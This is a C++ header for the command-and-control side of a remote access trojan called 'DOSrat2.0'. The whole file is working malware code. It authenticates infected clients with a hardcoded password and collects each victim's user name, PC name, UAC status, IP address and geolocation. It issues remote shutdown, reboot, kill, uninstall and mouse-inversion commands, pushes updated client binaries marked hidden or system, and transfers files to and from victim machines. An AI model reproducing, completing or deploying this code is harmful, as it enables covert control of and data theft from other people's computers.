#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	static void Inizializzazione(int ID, SOCKET Sock)
	{
		char Pass[10]; // DOSrat2.0
		string Buff;

		TcpIP::SetTimeout(10000, Sock);

		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return;
		}
		if (send(Sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}

		TcpIP::SetTimeout(0, Sock);
		if (!TcpIP::RecvString(Sock, Buff))
		{
			TerminaConnessione(Sock);
			return;
		}

		json data = json::parse(Buff);

		Clients[ID].IsConnected = true;
		Clients[ID].info.InstallPath = data["InstallPath"];
		Clients[ID].info.OS = data["OS"];
		Clients[ID].info.PCname = data["PCname"];
		Clients[ID].info.UAC = data["UAC"];
		Clients[ID].info.UserName = data["UserName"];
		Clients[ID].info.Versione = data["Versione"];
		Clients[ID].info.CompatibleVer = (data["VersioneCompatibile"].is_null()) ? 0 : (int)data["VersioneCompatibile"];

		Clients[ID].info.IP = TcpIP::GetIP(Sock);
		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);

		Clu->AggiornaTitolo();
	}

	static json GetInfo(SOCKET Sock)
	{
		string Buff = "";
		json j;

		if (!TcpIP::SendString(Sock, "getinfo"))
			return j;

		if(TcpIP::RecvString(Sock, Buff))
			j = json::parse(Buff);

		return j;
	}

	static string InvertMouse(SOCKET Sock)
	{
		string Buff;

		TcpIP::SendString(Sock, "invertmouse");

		TcpIP::RecvString(Sock, Buff);

		return Buff;
	}

	static bool Reconnect(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "reconnect");
	}

	static bool KillClient(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "kill");
	}

	static bool Shutdown(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "shutdown");
	}

	static bool Reboot(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "reboot");
	}

	static bool UpdateClient(SOCKET Sock, string FileContent, bool Hidden, bool System)
	{
		string Buff;
		json j;

		if (!TcpIP::SendString(Sock, "updateclient"))
			return false;

		if (!TcpIP::SendString(Sock, FileContent))
			return false;

		j["Hidden"] = Hidden;
		j["System"] = System;

		if (!TcpIP::SendString(Sock, j.dump()))
			return false;

		TcpIP::RecvString(Sock, Buff);

		return (Buff == "OK");
	}

	static bool Uninstall(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "uninstall");
	}

	static bool RestartClient(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "restart");
	}
	
	static string PingPong(SOCKET Sock, string Send)
	{
		string Buff = "";
		
		if (!TcpIP::SendString(Sock, Send))
			return "";
		
		if (!TcpIP::RecvString(Sock, Buff))
			return "";
		
		return Buff;
	}

	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FileContent, int BarSize = 20)
	{
		CLInterface cli;
		string Buff;

		if (!TcpIP::SendString(Sock, FileName))
			return false;

		if (!TcpIP::SendString(Sock, to_string(FileContent.size())))
			return false;

		if (FileContent.size() > 100)
		{
			int ChunkSize = FileContent.size() / 100;
			int ChunkNumber = FileContent.size() / ChunkSize;

			cli.FullBar(BarSize);

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (i + 1 == ChunkNumber)
				{
					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i)))
					{
						cli.StopBar();
						return false;
					}
				}
				else
					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i, ChunkSize)))
					{
						cli.StopBar();
						return false;
					}

				cli.LoadingPercentage = (int)((float)((i + 1) / (float)ChunkNumber) * 100);
			}

			cli.StopBar();
		}
		else
		{
			cli.FullBar(BarSize);

			if (!TcpIP::SendString(Sock, FileContent))
			{
				cli.StopBar();
				return false;
			}

			cli.LoadingPercentage = 100;
			cli.StopBar();
		}

		return true;
	}

	static bool DownloadFileWithLoading(SOCKET Sock, string &FileName, string &FileContent, int BarSize = 20)
	{
		CLInterface cli;
		string strFileSize;
		string Buff = "";

		if (!TcpIP::RecvString(Sock, FileName))
			return false;

		if (!TcpIP::RecvString(Sock, strFileSize))
			return false;

		int FileSize = stoi(strFileSize);

		if (FileSize > 100)
		{
			int ChunkSize = FileSize / 100;
			int ChunkNumber = FileSize / ChunkSize;

			cli.FullBar(BarSize);

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (!TcpIP::RecvString(Sock, Buff))
				{
					cli.StopBar();
					return false;
				}

				FileContent += Buff;
				Buff.clear();

				cli.LoadingPercentage = (int)((float)((i + 1) / (float)ChunkNumber) * 100);
			}

			cli.StopBar();
		}
		else
		{
			cli.FullBar(BarSize);

			if (!TcpIP::RecvString(Sock, FileContent))
			{
				cli.StopBar();
				return false;
			}

			cli.LoadingPercentage = 100;
			cli.StopBar();
		}

		return true;
	}
};